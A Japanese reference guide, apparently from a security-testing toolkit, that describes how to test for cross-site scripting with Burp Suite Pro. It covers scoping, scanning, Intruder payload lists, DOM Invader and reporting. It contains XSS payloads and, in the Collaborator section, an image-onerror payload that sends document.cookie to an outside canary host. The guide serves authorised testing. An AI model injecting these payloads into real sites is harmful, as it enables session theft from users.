# XSS — Burp Suite 運用

`client-side` の Phase 2 / Phase 5 から burp Pro 機能で効率化したい場面を扱う。手動・他ツール版は `references/xss-manual.md`。

## いつ切替えるか

- 大規模 web アプリの広い surface に対して効率的に XSS を網羅したい
- DOM-based XSS の source / sink 解析を burp DOM Invader で半自動化したい
- 手動 XSS 試験を burp Pro 機能で加速

## Phase 1 — proxy 設定

```
- burp proxy 起動 (127.0.0.1:8080)
- browser proxy 設定 + burp CA 証明書 import
- Target tab で scope 設定 (in-scope のみ記録)
- Logger を on (全リクエスト保存)
```

## Phase 2 — Scanner crawl

```
Dashboard → New Scan → Crawl + Audit
- Application login: 認証 cookie 設定 / login sequence record
- Audit selected issues: XSS / 全 active checks
- Scope: in-scope のみ
- Throttle: 本番なら 1-2 req/s
```

active scan 結果の `Reflected XSS` / `Stored XSS` / `DOM-based XSS` issue を確認。

## Phase 3 — Intruder で payload 反復

候補 endpoint を Intruder に送る:

```
Positions: 入力 parameter にマーカー
Payloads:
  - simple list: <script>alert(1)</script>, <svg/onload=alert(1)>, ...
  - PortSwigger XSS cheat sheet を import
  - tamper: encode (URL / HTML / unicode entity)
Attack type: Sniper (1 parameter), Cluster bomb (複数)
Settings: Grep - Match で alert(1) がレスポンスに出るか
```

## Phase 4 — Repeater で manual context 試験

```
Send to Repeater
header / body / cookie / parameter を context 別 payload で書換
Render tab で実 DOM 表示確認 (CSP / sanitizer の挙動)
```

## Phase 5 — DOM Invader

burp browser に組込まれた DOM Invader を有効化:

```
- DOM XSS: source / sink を自動 hook (location.search / innerHTML / eval / ...)
- Augmented DOM: source canary 追跡
- postMessage: cross-origin message の sink 解析
- prototype pollution: Object.prototype.<x> の gadget 検出
```

source canary を入力に injection し、どの sink に届くかをトレース。

## Phase 6 — Collaborator で blind / stored 確認

```
canary URL: <SUFFIX>.oastify.com
payload: "><img src=x onerror=fetch('https://<canary>/?c='+document.cookie)>
```

stored XSS は admin / 別ユーザが閲覧したタイミングで callback。Poll Now で hit を確認。

## Phase 7 — Param Miner / 拡張プラグイン

```
- Param Miner (hidden parameter 列挙)
- Reflector (reflection auto detection)
- Backslash Powered Scanner (mutation 系)
- Hackvertor (encoding 自動)
- Active Scan++ (追加 check)
```

## Phase 8 — レポート

```
- burp scanner 出力の重要 issue 抽出
- 確証用 Repeater request 添付 (raw HTTP)
- DOM Invader trace (source → sink)
- PoC payload と発火 GIF / screenshot
- 修正 (sanitizer / encode / CSP)
```

## Tools

```
burp Suite Pro (Scanner / Intruder / Repeater / DOM Invader / Collaborator)
burp Extensions: Param Miner / Reflector / Hackvertor / Backslash Powered Scanner / Active Scan++
WebFetch
Bash (sandbox)
```
